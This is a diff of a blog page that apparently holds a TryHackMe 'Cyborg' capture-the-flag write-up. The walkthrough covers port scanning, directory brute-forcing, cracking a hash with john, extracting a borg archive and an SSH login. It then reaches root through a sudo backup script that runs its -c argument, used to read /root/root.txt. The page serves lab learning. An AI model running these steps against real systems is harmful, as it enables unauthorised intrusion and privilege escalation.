@@ -5,20 +5,19 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>Cyborg - THM | Shebu 🔽</title>
+<title>Cyborg - THM | Shebu</title>
 <meta name="keywords" content="squid-proxy, borg backup, getopts, command injection">
 <meta name="description" content="Description A box involving encrypted archives, source code analysis and more.
 Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/cyborgt8 Creator fieldraccoon Enumeration Portscan ┌──(root💀kali)-[~/Cyborg] └─# rustscan -a cyborg.thm -- -sV -sC -oN cyborg.nmap # Nmap 7.92 scan initiated Sat Jan 22 10:09:17 2022 as: nmap -vvv -p 22,80 -sV -sC -oN cyborg.nmap 10.10.194.216 Nmap scan report for cyborg.thm (10.10.194.216) Host is up, received echo-reply ttl 63 (0.25s latency). Scanned at 2022-01-22 10:09:19 EST for 15s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.">
 <meta name="author" content="Shebu">
-<link rel="canonical" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/">
-<link crossorigin="anonymous" href="/themes/hugo-PaperMod/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
-<script defer crossorigin="anonymous" src="/themes/hugo-PaperMod/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
-    onload="hljs.initHighlightingOnLoad();"></script>
-<link rel="icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/apple-touch-icon.png">
-<link rel="mask-icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/safari-pinned-tab.svg">
+<link rel="canonical" href="https://sh3bu.github.io/posts/cyborg/">
+<meta name="google-site-verification" content="GTM-NNK933J">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.7140587df96a2b1a49eb723fa7063dc0c641a6cb638f3140e8d3beb4deae4f5c.css" integrity="sha256-cUBYfflqKxpJ63I/pwY9wMZBpstjjzFA6NO&#43;tN6uT1w=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://sh3bu.github.io/img/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://sh3bu.github.io/img/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://sh3bu.github.io/img/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://sh3bu.github.io/img/apple-touch-icon.png">
+<link rel="mask-icon" href="https://sh3bu.github.io/img/apple-touch-icon.png">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
 <noscript>
@@ -57,17 +56,28 @@ Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/c
         }
 
     </style>
-</noscript><meta property="og:title" content="Cyborg - THM" />
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-T6XL9391MH"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-T6XL9391MH', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="Cyborg - THM" />
 <meta property="og:description" content="Description A box involving encrypted archives, source code analysis and more.
 Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/cyborgt8 Creator fieldraccoon Enumeration Portscan ┌──(root💀kali)-[~/Cyborg] └─# rustscan -a cyborg.thm -- -sV -sC -oN cyborg.nmap # Nmap 7.92 scan initiated Sat Jan 22 10:09:17 2022 as: nmap -vvv -p 22,80 -sV -sC -oN cyborg.nmap 10.10.194.216 Nmap scan report for cyborg.thm (10.10.194.216) Host is up, received echo-reply ttl 63 (0.25s latency). Scanned at 2022-01-22 10:09:19 EST for 15s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/" />
-<meta property="og:image" content="https://sh3bu.github.io/themes/hugo-PaperMod/img/cyborg.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://sh3bu.github.io/posts/cyborg/" />
+<meta property="og:image" content="https://sh3bu.github.io/img/cyborg.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-12-25T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-12-25T00:00:00+00:00" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://sh3bu.github.io/themes/hugo-PaperMod/img/cyborg.png" />
+<meta name="twitter:image" content="https://sh3bu.github.io/img/cyborg.png" />
 <meta name="twitter:title" content="Cyborg - THM"/>
 <meta name="twitter:description" content="Description A box involving encrypted archives, source code analysis and more.
 Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/cyborgt8 Creator fieldraccoon Enumeration Portscan ┌──(root💀kali)-[~/Cyborg] └─# rustscan -a cyborg.thm -- -sV -sC -oN cyborg.nmap # Nmap 7.92 scan initiated Sat Jan 22 10:09:17 2022 as: nmap -vvv -p 22,80 -sV -sC -oN cyborg.nmap 10.10.194.216 Nmap scan report for cyborg.thm (10.10.194.216) Host is up, received echo-reply ttl 63 (0.25s latency). Scanned at 2022-01-22 10:09:19 EST for 15s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7."/>
@@ -77,18 +87,18 @@ Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/c
 {
   "@context": "https://schema.org",
   "@type": "BreadcrumbList",
-  "itemListElement": [, 
+  "itemListElement": [
     {
       "@type": "ListItem",
-      "position":  2 ,
+      "position":  1 ,
       "name": "Posts",
-      "item": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/"
+      "item": "https://sh3bu.github.io/posts/"
     }, 
     {
       "@type": "ListItem",
-      "position":  3 ,
+      "position":  2 ,
       "name": "Cyborg - THM",
-      "item": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/"
+      "item": "https://sh3bu.github.io/posts/cyborg/"
     }
   ]
 }
@@ -106,7 +116,7 @@ Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/c
   "articleBody": "Description A box involving encrypted archives, source code analysis and more.\nRoom name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/cyborgt8 Creator fieldraccoon Enumeration Portscan ┌──(root💀kali)-[~/Cyborg] └─# rustscan -a cyborg.thm -- -sV -sC -oN cyborg.nmap # Nmap 7.92 scan initiated Sat Jan 22 10:09:17 2022 as: nmap -vvv -p 22,80 -sV -sC -oN cyborg.nmap 10.10.194.216 Nmap scan report for cyborg.thm (10.10.194.216) Host is up, received echo-reply ttl 63 (0.25s latency). Scanned at 2022-01-22 10:09:19 EST for 15s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB/4p/qSoPbsGWvDUlSTUYMDcxNqaADH/nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo/tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG+UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL/amXt2uiRrBgsmz2AuF+ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz+7/Na9huvDkLFkr5Soh | 256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV/je/alwaaJ8qljr3iLnKKGkwC4+PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20= | 256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC+LelPmOMm9S8ugHG2TtZ5HpFuZQ 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jan 22 10:09:34 2022 -- 1 IP address (1 host up) scanned in 17.23 seconds Website It gives us the default apache page and nothing else.\nLets do some directory-bruteforcing .\n┌──(root💀kali)-[~/Cyborg] └─# dirsearch -u cyborg.thm -w /usr/share/wordlists/dirb/common.txt _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613 Output File: /root/.dirsearch/reports/cyborg.thm/_22-01-22_10-18-59.txt Error Log: /root/.dirsearch/logs/errors-22-01-22_10-18-59.log Target: http://cyborg.thm/ [10:19:00] Starting: [10:19:06] 301 - 308B - /admin -\u003e http://cyborg.thm/admin/ [10:19:23] 301 - 306B - /etc -\u003e http://cyborg.thm/etc/ [10:19:29] 200 - 11KB - /index.html [10:19:47] 403 - 275B - /server-status Task Completed /admin There is a possible username called Alex in setup description.\nClicking on admin tab leads us to /admin/admin.html\nSeems like a chat between Josh, Adam and Alex where he mentions about some kind of music_archive.\nThe archive tab gives us two more options listen and download\nClicking on download button downloads an archive.tar file.\n/etc The passwd file contains a hash\nThe squid.conf file contains the squid proxy configuration.\nShell as Alex Lets untar the tar archive and examine it.\n┌──(root💀kali)-[~/Cyborg] └─# tar -xvf archive.tar home/field/dev/final_archive/ home/field/dev/final_archive/hints.5 home/field/dev/final_archive/integrity.5 home/field/dev/final_archive/config home/field/dev/final_archive/README home/field/dev/final_archive/nonce home/field/dev/final_archive/index.5 home/field/dev/final_archive/data/ home/field/dev/final_archive/data/0/ home/field/dev/final_archive/data/0/5 home/field/dev/final_archive/data/0/3 home/field/dev/final_archive/data/0/4 home/field/dev/final_archive/data/0/1 ┌──(root💀kali)-[~/Cyborg] └─# cd home/field/dev/final_archive/ ┌──(root💀kali)-[~/…/home/field/dev/final_archive] └─# ls config data hints.5 index.5 integrity.5 nonce README So it contains 7 files .Lets check out the README file first.\nborg archive ┌──(root💀kali)-[~/…/home/field/dev/final_archive] └─# cat README This is a Borg Backup repository. See https://borgbackup.readthedocs.io/ So it tells us this is a borg archive repository \u0026 also provides a link to its documentation website.\nHere you can read how to extract contents from the borg archive - https://borgbackup.readthedocs.io/en/stable/usage/extract.html\n┌──(root💀kali)-[~/Cyborg] └─# borg extract home/field/dev/final_archive::music_archive Enter passphrase for key /root/Cyborg/home/field/dev/final_archive: It asks us for a passphrase. Remember we got a hash from the website earlier ! Let crack it using john.\njtr ┌──(root💀kali)-[~/Cyborg] └─# john hash --wordlist=/usr/share/wordlists/rockyou.txt 130 ⨯ Created directory: /root/.john Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status squ****rd (?) 1g 0:00:00:00 DONE (2022-01-22 10:50) 1.052g/s 41027p/s 41027c/s 41027C/s wonderfull..samantha5 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Now since we have the password lets extract the contents of the borg archive.\nWe get a folder called alex. Lets see what’s in here\n┌──(root💀kali)-[~/Cyborg/home] └─# tree alex 127 ⨯ alex ├── Desktop │ └── secret.txt ├── Documents │ └── note.txt ├── Downloads ├── Music ├── Pictures ├── Public ├── Templates └── Videos 8 directories, 2 files secret.txt wasn’t useful but note.txt had SSH creds for the user Alex\n┌──(root💀kali)-[~/Cyborg/home] └─# cat alex/Desktop/secret.txt shoutout to all the people who have gotten to this stage whoop whoop!\" ┌──(root💀kali)-[~/Cyborg/home] └─# cat alex/Documents/note.txt Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down! alex:S3********3 user.txt 🚩 Lets ssh in as alex \u0026 grab the user.txt flag !\n┌──(root💀kali)-[~/Cyborg/home] └─# ssh alex@cyborg.thm 130 ⨯ alex@cyborg.thm's password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 27 packages can be updated. 0 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. alex@ubuntu:~$ whoami alex alex@ubuntu:~$ id uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) alex@ubuntu:~$ cat user.txt flag{1_hop3*******************saf3} Shell as root Running sudo -l reveals that we could run backup.sh as root\nalex@ubuntu:~$ sudo -l Matching Defaults entries for alex on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User alex may run the following commands on ubuntu: (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh backup.sh alex@ubuntu:~$ cat /etc/mp3backups/backup.sh #!/bin/bash sudo find / -name \"*.mp3\" | sudo tee /etc/mp3backups/backed_up_files.txt input=\"/etc/mp3backups/backed_up_files.txt\" #while IFS= read -r line #do #a=\"/etc/mp3backups/backed_up_files.txt\" # b=$(basename $input) #echo # echo \"$line\" #done \u003c \"$input\" while getopts c: flag do case \"${flag}\" in c) command=${OPTARG};; esac done backup_files=\"/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3\" # Where to backup to. dest=\"/etc/mp3backups/\" # Create archive filename. hostname=$(hostname -s) archive_file=\"$hostname-scheduled.tgz\" # Print start status message. echo \"Backing up $backup_files to $dest/$archive_file\" echo # Backup the files using tar. tar czf $dest/$archive_file $backup_files # Print end status message. echo echo \"Backup finished\" cmd=$($command) echo $cmd From the above code , we could understand that it backups all the music files but this particular lines stand out\ngetopts while getopts c: flag do case \"${flag}\" in c) command=${OPTARG};; esac done Here it asks for a input flag -c using getopts and executes the i/p command given to -c at the end of the script\ncmd=$($command) echo $cmd getopts is a very convenient bash script utility, which helps you to conveniently handle the passing of flags\nLet try giving id command as i/p in -c flag\nalex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c id [redacted] Backup finished uid=0(root) gid=0(root) groups=0(root) It works !!\nroot.txt 🚩 Lets now retreive root.txt flag\nalex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c \"cat /root/root.txt\" [redacted] Backup finished flag{Than5s****************enJ053d} ",
   "wordCount" : "1052",
   "inLanguage": "en",
-  "image":"https://sh3bu.github.io/themes/hugo-PaperMod/img/cyborg.png","datePublished": "2021-12-25T00:00:00Z",
+  "image":"https://sh3bu.github.io/img/cyborg.png","datePublished": "2021-12-25T00:00:00Z",
   "dateModified": "2021-12-25T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -114,14 +124,14 @@ Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/c
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/"
+    "@id": "https://sh3bu.github.io/posts/cyborg/"
   },
   "publisher": {
     "@type": "Organization",
-    "name": "Shebu 🔽",
+    "name": "Shebu",
     "logo": {
       "@type": "ImageObject",
-      "url": "https://sh3bu.github.io/themes/hugo-PaperMod/favicon.ico"
+      "url": "https://sh3bu.github.io/img/favicon.ico"
     }
   }
 }
@@ -143,7 +153,9 @@ Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/c
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://sh3bu.github.io/themes/hugo-PaperMod" accesskey="h" title="Shebu 🔽 (Alt + H)">Shebu 🔽</a>
+            <a href="https://sh3bu.github.io/" accesskey="h" title="Shebu&#39;s Blog (Alt + H)">
+                <img src="https://sh3bu.github.io/img/goku.png" alt="" aria-label="logo"
+                    height="90">Shebu&#39;s Blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -169,17 +181,17 @@ Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/c
         </div>
         <ul id="menu">
             <li>
-                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/archives" title="Archive">
+                <a href="https://sh3bu.github.io/archives" title="Archive">
                     <span>Archive</span>
                 </a>
             </li>
             <li>
-                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://sh3bu.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
             <li>
-                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/" title="Tags">
+                <a href="https://sh3bu.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
@@ -190,7 +202,7 @@ Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/c
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="https://sh3bu.github.io/themes/hugo-PaperMod">Home</a>&nbsp;»&nbsp;<a href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://sh3bu.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://sh3bu.github.io/posts/">Posts</a></div>
     <h1 class="post-title">
       Cyborg - THM
     </h1>
@@ -199,8 +211,8 @@ Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/c
 </div>
   </header> 
 <figure class="entry-cover">
-        <img loading="lazy" srcset="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/img/cyborg_hud10a34951016c737e2f67240fb556a71_296346_360x0_resize_box_3.png 360w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/img/cyborg_hud10a34951016c737e2f67240fb556a71_296346_480x0_resize_box_3.png 480w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/img/cyborg_hud10a34951016c737e2f67240fb556a71_296346_720x0_resize_box_3.png 720w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/img/cyborg_hud10a34951016c737e2f67240fb556a71_296346_1080x0_resize_box_3.png 1080w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/img/cyborg.png 1115w" 
-            sizes="(min-width: 768px) 720px, 100vw" src="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/img/cyborg.png" alt="" 
+        <img loading="lazy" srcset="https://sh3bu.github.io/posts/cyborg/img/cyborg_hud10a34951016c737e2f67240fb556a71_296346_360x0_resize_box_3.png 360w ,https://sh3bu.github.io/posts/cyborg/img/cyborg_hud10a34951016c737e2f67240fb556a71_296346_480x0_resize_box_3.png 480w ,https://sh3bu.github.io/posts/cyborg/img/cyborg_hud10a34951016c737e2f67240fb556a71_296346_720x0_resize_box_3.png 720w ,https://sh3bu.github.io/posts/cyborg/img/cyborg_hud10a34951016c737e2f67240fb556a71_296346_1080x0_resize_box_3.png 1080w ,https://sh3bu.github.io/posts/cyborg/img/cyborg.png 1115w" 
+            sizes="(min-width: 768px) 720px, 100vw" src="https://sh3bu.github.io/posts/cyborg/img/cyborg.png" alt="" 
             width="1115" height="628">
         <p><text></p>
 </figure><div class="toc">
@@ -395,10 +407,10 @@ Room name Cyborg OS Linux Difficulty Easy Room Link https://tryhackme.com/room/c
 </span></span><span class="line"><span class="cl">See https://borgbackup.readthedocs.io/
 </span></span></code></pre></div><p>So it tells us this is a <code>borg archive</code> repository &amp; also provides a link to its documentation website.</p>
 <p>Here you can read how to extract contents from the borg archive - <a href="https://borgbackup.readthedocs.io/en/stable/usage/extract.html">https://borgbackup.readthedocs.io/en/stable/usage/extract.html</a></p>
-<pre tabindex="0"><code>┌──(root💀kali)-[~/Cyborg]
-└─# borg extract home/field/dev/final_archive::music_archive
-Enter passphrase for key /root/Cyborg/home/field/dev/final_archive: 
-</code></pre><p>It asks us for a passphrase. Remember we got a hash from the website earlier ! Let crack it using john.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[~/Cyborg]
+</span></span><span class="line"><span class="cl">└─# borg extract home/field/dev/final_archive::music_archive
+</span></span><span class="line"><span class="cl">Enter passphrase for key /root/Cyborg/home/field/dev/final_archive: 
+</span></span></code></pre></div><p>It asks us for a passphrase. Remember we got a hash from the website earlier ! Let crack it using john.</p>
 <h2 id="jtr">jtr<a hidden class="anchor" aria-hidden="true" href="#jtr">#</a></h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/Cyborg<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─# john <span class="nb">hash</span> --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt                                                                                             <span class="m">130</span> ⨯
@@ -563,18 +575,18 @@ Enter passphrase for key /root/Cyborg/home/field/dev/final_archive:
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/squid-proxy/">squid-proxy</a></li>
-      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/borg-backup/">borg backup</a></li>
-      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/getopts/">getopts</a></li>
-      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/command-injection/">command-injection</a></li>
+      <li><a href="https://sh3bu.github.io/tags/squid-proxy/">squid-proxy</a></li>
+      <li><a href="https://sh3bu.github.io/tags/borg-backup/">borg backup</a></li>
+      <li><a href="https://sh3bu.github.io/tags/getopts/">getopts</a></li>
+      <li><a href="https://sh3bu.github.io/tags/command-injection/">command-injection</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/">
+  <a class="prev" href="https://sh3bu.github.io/posts/cmspit/">
     <span class="title">« Prev</span>
     <br>
     <span>CMSpit - THM</span>
   </a>
-  <a class="next" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/convertmyvideo/">
+  <a class="next" href="https://sh3bu.github.io/posts/convertmyvideo/">
     <span class="title">Next »</span>
     <br>
     <span>ConvertMyVideo - THM</span>
@@ -584,42 +596,42 @@ Enter passphrase for key /root/Cyborg/home/field/dev/final_archive:
 
 <div class="share-buttons">
     <a target="_blank" rel="noopener noreferrer" aria-label="share Cyborg - THM on twitter"
-        href="https://twitter.com/intent/tweet/?text=Cyborg%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcyborg%2f&amp;hashtags=squid-proxy%2cborgbackup%2cgetopts%2ccommandinjection">
+        href="https://twitter.com/intent/tweet/?text=Cyborg%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fposts%2fcyborg%2f&amp;hashtags=squid-proxy%2cborgbackup%2cgetopts%2ccommandinjection">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Cyborg - THM on linkedin"
-        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcyborg%2f&amp;title=Cyborg%20-%20THM&amp;summary=Cyborg%20-%20THM&amp;source=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcyborg%2f">
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsh3bu.github.io%2fposts%2fcyborg%2f&amp;title=Cyborg%20-%20THM&amp;summary=Cyborg%20-%20THM&amp;source=https%3a%2f%2fsh3bu.github.io%2fposts%2fcyborg%2f">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Cyborg - THM on reddit"
-        href="https://reddit.com/submit?url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcyborg%2f&title=Cyborg%20-%20THM">
+        href="https://reddit.com/submit?url=https%3a%2f%2fsh3bu.github.io%2fposts%2fcyborg%2f&title=Cyborg%20-%20THM">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
